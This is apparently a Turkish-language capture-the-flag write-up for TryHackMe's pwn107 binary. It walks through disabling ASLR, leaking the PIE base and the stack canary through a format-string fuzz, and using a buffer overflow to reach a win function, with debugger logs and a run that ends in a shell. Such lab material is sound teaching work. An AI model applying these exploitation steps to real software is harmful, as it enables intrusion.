Özet sıralama:
1-PIE Taban Adresini Almak: Adreslerin rastgele olduğunu belirttikleri için,
PIE taban adresini bulmak için bir teknik kullanacaklar.
2-Yığın Canary Adresini Sızdırmak: Yığın koruması ile birlikte yığın canary
adresini sızdırmak için bir yöntem kullanacaklar.
3-Ret2Win: Son olarak, tampon taşması kullanarak ret2win işlevini çağıracaklar.

Steps:
1. Aslr kapatılacak:
└─$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
[sudo] password for mark: 0

2. piebase leak için FUZZ1.py kullanılacak. Bu fuzz ile her çalışmada drğişmeyen adres tespit edilecek;
└─$ python3 fuzz.py  
     17: b'0x555555400992\n'
                                                                                                        
┌──(mark㉿haxor)-[~/…/B2B/THM/Pwn101/pwn107]
└─$ python3 fuzz.py
    17: b'0x555555400992\n'

3. Bulunan bu değişmeyen bu adres ile piebase adresi hesap edilecek.

└─$ gdb-pwndbg -q pwn107.pwn107
Reading symbols from pwn107.pwn107...
(No debugging symbols found in pwn107.pwn107)
pwndbg: loaded 138 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
The set show-flags on setting will display CPU flags register in the regs context panel
pwndbg> break main
Breakpoint 1 at 0x996
pwndbg> r
Starting program: /home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555400996 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────
*RAX  0x555555400992 (main) ◂— push rbp
*RBX  0x7fffffffdfb8 —▸ 0x7fffffffe306 ◂— '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
*RCX  0x7ffff7f9b820 (__exit_funcs) —▸ 0x7ffff7f9d2e0 (initial) ◂— 0x0
*RDX  0x7fffffffdfc8 —▸ 0x7fffffffe33d ◂— 0x5245545f5353454c ('LESS_TER')
*RDI  0x1
*RSI  0x7fffffffdfb8 —▸ 0x7fffffffe306 ◂— '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
*R8   0x555555400b00 (__libc_csu_fini) ◂— ret 
*R9   0x7ffff7fcf6a0 (_dl_fini) ◂— push rbp
*R10  0x7ffff7fcb878 ◂— 0xc00120000000e
*R11  0x7ffff7fe18c0 (_dl_audit_preinit) ◂— mov eax, dword ptr [rip + 0x1b552]
 R12  0x0
*R13  0x7fffffffdfc8 —▸ 0x7fffffffe33d ◂— 0x5245545f5353454c ('LESS_TER')
 R14  0x0
*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555400000 ◂— jg 0x555555400047
*RBP  0x7fffffffdea0 ◂— 0x1
*RSP  0x7fffffffdea0 ◂— 0x1
*RIP  0x555555400996 (main+4) ◂— sub rsp, 0x40
──────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────
 ► 0x555555400996 <main+4>     sub    rsp, 0x40
   0x55555540099a <main+8>     mov    rax, qword ptr fs:[0x28]
   0x5555554009a3 <main+17>    mov    qword ptr [rbp - 8], rax
   0x5555554009a7 <main+21>    xor    eax, eax
   0x5555554009a9 <main+23>    mov    eax, 0
   0x5555554009ae <main+28>    call   setup                <setup>
 
   0x5555554009b3 <main+33>    mov    eax, 0
   0x5555554009b8 <main+38>    call   banner                <banner>
 
   0x5555554009bd <main+43>    lea    rdi, [rip + 0x2a4]
   0x5555554009c4 <main+50>    call   puts@plt                <puts@plt>
 
   0x5555554009c9 <main+55>    lea    rdi, [rip + 0x2b8]
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffdea0 ◂— 0x1
01:0008│         0x7fffffffdea8 —▸ 0x7ffff7df018a (__libc_start_call_main+122) ◂— mov edi, eax
02:0010│         0x7fffffffdeb0 —▸ 0x7fffffffdfa0 —▸ 0x7fffffffdfa8 ◂— 0x38 /* '8' */
03:0018│         0x7fffffffdeb8 —▸ 0x555555400992 (main) ◂— push rbp
04:0020│         0x7fffffffdec0 ◂— 0x155400040 /* '@' */
05:0028│         0x7fffffffdec8 —▸ 0x7fffffffdfb8 —▸ 0x7fffffffe306 ◂— '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
06:0030│         0x7fffffffded0 —▸ 0x7fffffffdfb8 —▸ 0x7fffffffe306 ◂— '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
07:0038│         0x7fffffffded8 ◂— 0x521dd9f736185b23
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0   0x555555400996 main+4
   f 1   0x7ffff7df018a __libc_start_call_main+122
   f 2   0x7ffff7df0245 __libc_start_main+133
   f 3   0x5555554007aa _start+42
────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> piebase
Calculated VA from /home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107 = 0x555555400000
pwndbg> 

4. Read çağrısının olduğu yerde buffer overflow açığı vardı.
Oraya breakpoint koyuyoruz. Sonrasında 2. adımda bulduğumuz adresi kullanarak offset bulacağız.

0x0000000000000a69 <+215>:   call   0x750 <read@plt>
 pwndbg> breakrva 0xa69
Breakpoint 2 at 0x555555400a69
pwndbg> c
Continuing.
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? lol
Thanks, Happy hacking!!
Your current streak: lol


[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢

Breakpoint 2, 0x0000555555400a69 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────
*RAX  0x0
 RBX  0x7fffffffdfb8 —▸ 0x7fffffffe306 ◂— '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
*RCX  0x7ffff7ec1190 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x200
*RDI  0x0
*RSI  0x7fffffffde80 ◂— 0x0
 R8   0x555555400b00 (__libc_csu_fini) ◂— ret 
 R9   0x7ffff7fcf6a0 (_dl_fini) ◂— push rbp
 R10  0x7ffff7fcb878 ◂— 0xc00120000000e
*R11  0x202
 R12  0x0
 R13  0x7fffffffdfc8 —▸ 0x7fffffffe33d ◂— 0x5245545f5353454c ('LESS_TER')
 R14  0x0
 R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555400000 ◂— jg 0x555555400047
 RBP  0x7fffffffdea0 ◂— 0x1
*RSP  0x7fffffffde60 ◂— 0xa6c6f6c /* 'lol\n' */
*RIP  0x555555400a69 (main+215) ◂— call 0x555555400750
──────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────
 ► 0x555555400a69 <main+215>           call   read@plt                <read@plt>
        fd: 0x0 (/dev/pts/2)
        buf: 0x7fffffffde80 ◂— 0x0
        nbytes: 0x200
 
   0x555555400a6e <main+220>           nop    
   0x555555400a6f <main+221>           mov    rax, qword ptr [rbp - 8]
   0x555555400a73 <main+225>           xor    rax, qword ptr fs:[0x28]
   0x555555400a7c <main+234>           je     main+241                <main+241>
 
   0x555555400a7e <main+236>           call   __stack_chk_fail@plt                <__stack_chk_fail@plt>
 
   0x555555400a83 <main+241>           leave  
   0x555555400a84 <main+242>           ret    
 
   0x555555400a85                      nop    word ptr cs:[rax + rax]
   0x555555400a8f                      nop    
   0x555555400a90 <__libc_csu_init>    push   r15
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffde60 ◂— 0xa6c6f6c /* 'lol\n' */
01:0008│     0x7fffffffde68 ◂— 0x0
... ↓        3 skipped
05:0028│     0x7fffffffde88 —▸ 0x7ffff7fe6e10 (dl_main) ◂— push rbp
06:0030│     0x7fffffffde90 ◂— 0x0
07:0038│     0x7fffffffde98 ◂— 0xde96d2eee6ebeb00
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0   0x555555400a69 main+215
   f 1   0x7ffff7df018a __libc_start_call_main+122
   f 2   0x7ffff7df0245 __libc_start_main+133
   f 3   0x5555554007aa _start+42
────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
pwndbg> x 0x555555400992
0x555555400992 <main>:  0xe5894855
pwndbg> x 0x555555400992 - 0x555555400000
0x992:  Cannot access memory at address 0x992
pwndbg>

5. Yukarıda offset 0x992 olarak bulundu.
6. Şimdi sıra stack canary leak bulmakta.
7. Canary adresinin sonu 00 ile bitermiş ve ff veya f7 ile başlamayacak.. Fuzz ile 13. buldu.
└─$ python3 fuzz.py                         
    13: b'0xd6b190b256ee5f00\n'
8. Geriye exploit.py'e bulduğumuz bu leakleri yazıp çalıştırmak kaldı.
└─$ python3 exploit.py
[+] Starting local process './pwn107.pwn107': pid 180823
[*] Canary address: 0xdf4535f29136bb00
[*] Leaked Pie address: 0x555555400992
[*] Piebase address: 0x555555400000
[*] Switching to interactive mode


[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩💻 - We miss you!😢
This your last streak back, don't do this mistake again
$ ls -al
total 36
drwxr-xr-x  2 mark mark  4096 Feb 17 13:17 .
drwxr-xr-x 10 mark mark  4096 Feb 16 17:27 ..
-rw-r--r--  1 mark mark  1700 Feb 17 13:16 exploit.py
-rw-r--r--  1 mark mark  1403 Feb 17 03:13 fuzz.py
-rw-------  1 mark mark   453 Feb 16 17:33 .gdb_history
-rwxr-xr-x  1 mark mark 12848 Feb 15 22:17 pwn107.pwn107
$ 
